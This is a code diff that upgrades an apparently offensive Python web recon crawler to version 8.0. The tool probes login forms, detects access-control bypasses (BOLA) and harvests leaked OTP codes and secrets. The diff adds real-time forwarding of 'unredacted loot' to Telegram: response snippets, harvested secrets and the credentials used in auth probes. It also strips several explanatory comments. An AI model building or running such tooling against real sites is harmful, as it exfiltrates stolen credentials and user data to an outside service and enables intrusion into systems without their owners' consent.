@@ -1,15 +1,19 @@
 #!/usr/bin/env python3
 """
-CRAWLER.PY v7.5 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (Elite Edition)
+CRAWLER.PY v8.0 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (With Telegram Telemetry)
 Senior Red Team Edition: AST-level JavaScript bundle parsing, dynamic API prefix expansion,
-entropy inspection, and robust false-positive elimination for admin/BOLA checks.
+entropy inspection, robust false-positive elimination, and real-time Telegram broadcasting.
 """
 import json
 import random
 import re
 import sys
+import asyncio
 from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
+
+# Import centralized Telegram broadcaster
+from modules.telegram_notifier import send_telegram_alert
 
 # Optional AST parser integration for deep Webpack/Vite bundle analysis
 try:
@@ -64,7 +68,6 @@ class StateMachineMapper:
         for ep in restricted_endpoints:
             status, headers, body = transport.request("GET", ep)
             
-            # False-positive elimination: Check if HTTP 200 actually returned a login form or SPA fallback shell
             is_false_positive = False
             if status in [200, 201] and isinstance(body, str):
                 lower_body = body.lower()
@@ -74,6 +77,15 @@ class StateMachineMapper:
             if status in [200, 201] and not is_false_positive:
                 sys.stdout.write(f"\033[91m[!] BINGO! True State-Skipping / BOLA Vulnerability detected at: {ep} [HTTP {status}]\033[0m\n")
                 vulnerabilities.append(ep)
+                
+                loot_payload = {
+                    "endpoint": ep,
+                    "status": status,
+                    "response_snippet": body[:400]
+                }
+                # BROADCAST UNREDACTED BOLA / STATE-SKIPPING LOOT TO TELEGRAM
+                broadcast_tg_alert_sync("BOLA / State-Skipping Vulnerability Confirmed", loot_payload)
+
             elif is_false_positive:
                 sys.stdout.write(f"\033[93m[-] Endpoint {ep} returned HTTP 200 but served a login gate. False positive avoided.\033[0m\n")
             else:
@@ -85,24 +97,28 @@ def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from crawler functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
+
 def inspect_js_bundle_ast(js_content):
-    """
-    AST-level JS Parser: Extracts route strings and API endpoints directly from 
-    JavaScript Abstract Syntax Tree nodes (Webpack chunks, React/Vue routers).
-    """
     discovered_routes = set()
     if not HAS_ESPRIMA or not isinstance(js_content, str) or len(js_content) > 2_500_000:
         return discovered_routes, {}
 
     try:
         syntax = esprima.parseScript(js_content, tolerant=True)
-        
-        # Recursive node walker to find all string literals representing URI paths
         def walk(node):
             if isinstance(node, dict):
                 if node.get("type") == "Literal" and isinstance(node.get("value"), str):
                     val = node["value"].strip()
-                    # Match route paths or API endpoints
                     if (val.startswith("/") and len(val) > 1 and " " not in val and 
                         not any(val.endswith(ext) for ext in ['.js', '.css', '.png', '.jpg', '.woff'])):
                         discovered_routes.add(val)
@@ -201,7 +217,7 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
             elif 'pass' in name:
                 payload[inp['name']] = operator_pass
             elif 'refer' in name:
-                payload[inp['name']] = None  # Testing null referral bypass vector explicitly
+                payload[inp['name']] = None
             elif 'token' in name or 'csrf' in name:
                 payload[inp['name']] = inp.get('default', 'dummy_token')
             else:
@@ -218,6 +234,7 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
         detected_codes = inspect_json_for_leaked_codes(body)
         if detected_codes:
             leaked_secrets.update(detected_codes)
+            broadcast_tg_alert_sync("Leaked Secrets / OTP Codes Harvested", {"endpoint": action_url, "secrets": detected_codes})
 
         if status in [200, 201, 302]:
             cookie_header = headers.get("set-cookie") or headers.get("Set-Cookie", "")
@@ -232,12 +249,21 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
             
             operator_creds = payload
             log(f"[+] Auth gate interaction successful at {action_url} [HTTP {status}]", "\033[92m")
+            
+            loot_payload = {
+                "action_url": action_url,
+                "status": status,
+                "credentials": operator_creds,
+                "leaked_secrets": leaked_secrets
+            }
+            broadcast_tg_alert_sync("Intelligent Auth Probe Success", loot_payload)
+
             return session_output, operator_creds, leaked_secrets
 
     return session_output, operator_creds, leaked_secrets
 
 def crawl_target(transport):
-    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v7.5) [***]", "\033[95m")
+    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v8.0) [***]", "\033[95m")
     discovered_endpoints = set()
     discovered_scripts = set()
     all_forms_intel = []
@@ -306,16 +332,13 @@ def crawl_target(transport):
             elif not script.startswith("http"):
                 discovered_scripts.add(urljoin(path, script))
 
-    # Advanced AST-Level JavaScript Bundle Harvesting
     for script_path in list(discovered_scripts)[:15]:
         s_status, _, s_content = transport.request("GET", script_path)
         if s_status == 200 and isinstance(s_content, str):
-            # Fallback regex extraction
             for match in endpoint_in_js.findall(s_content):
                 if len(match) > 3 and not any(match.endswith(ext) for ext in ['.js', '.css', '.png']):
                     discovered_endpoints.add(match)
             
-            # True AST-Level parsing extraction
             try:
                 ast_routes, _ = inspect_js_bundle_ast(s_content)
                 for route in ast_routes:
